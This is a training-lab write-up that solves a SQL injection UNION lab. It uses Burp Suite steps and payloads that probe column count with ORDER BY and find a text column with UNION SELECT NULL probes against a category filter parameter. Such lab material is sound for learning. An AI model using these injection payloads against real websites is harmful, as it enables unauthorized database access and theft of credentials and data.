# 📝 Lab: SQL injection UNION attack, finding a column containing text

- **Vulnerability:** SQL Injection.
- **Difficulty:** PRACTITIONER.
- **Objective:** Find a column that accepts text (string) data and output a specific random string provided by the lab.

---

## 🛠️ Tools Used
- Browser (FoxyProxy)
- Burp Suite

---
*(Note: Since I've explained the basics a lot in previous labs, I'll keep this one short and sweet! 😊)*

## 🐾 Steps to Reproduce
1. Open the lab's main page, turn on the *FoxyProxy* extension, and click on any category (e.g., Pets).
2. Open **Burp Suite -> Proxy -> HTTP History**, find the request, and press `Ctrl+R` to send it to **Repeater**.
3. In Repeater, look at the request: `GET /filter?category=Pets HTTP/2`. The `category` parameter is our vulnerable injection point.
4. First, find out the column count using the `ORDER BY` method. Inject `'+ORDER+BY+1--` and keep increasing the number until you hit an error. In this case, we find out there are **3 columns**.
5. Next, we use the `UNION` payload to figure out which column accepts string data. We inject `'+UNION+SELECT+NULL,NULL,NULL--` and replace the `NULL` values one by one with a random text like `'a'` to see which one doesn't break the page.
6. Once we find the string-compatible column (in this case, it's the second column), inject the specific string provided by the lab (e.g., `'r95bjX'`). 
   *Note: Your random string will be different, just check the hint on the lab's instruction page!*
   Payload: `GET /filter?category=Pets'+UNION+SELECT+NULL,'r95bjX',NULL--`
7. Done! The **Lab Solved** banner will appear.

<img width="1917" height="907" alt="Screenshot 2026-09-16 234716" src="https://github.com/user-attachments/assets/1adcea5a-96ad-4b99-8417-0d326e19d3a6" />

---

## 🎯 Impact
Identifying which columns can hold text (strings) is a crucial step. Without knowing this, attackers cannot extract useful text-based data like usernames, passwords, or secret tokens. Once a string-compatible column is found, it becomes the main tunnel for data exfiltration.

---

## 💣 Payload
```sql
-- Finding the column that accepts strings
'+UNION+SELECT+'a',NULL,NULL--
'+UNION+SELECT+NULL,'a',NULL--
'+UNION+SELECT+NULL,NULL,'a'--

-- Injecting the required string (Replace 'r95bjX' with your lab's string)
'+UNION+SELECT+NULL,'r95bjX',NULL--
```
## 🔗 Reference:
For more powerful payloads, check out the [PortSwigger SQLi Cheat Sheet.](https://portswigger.net/web-security/sql-injection/cheat-sheet)
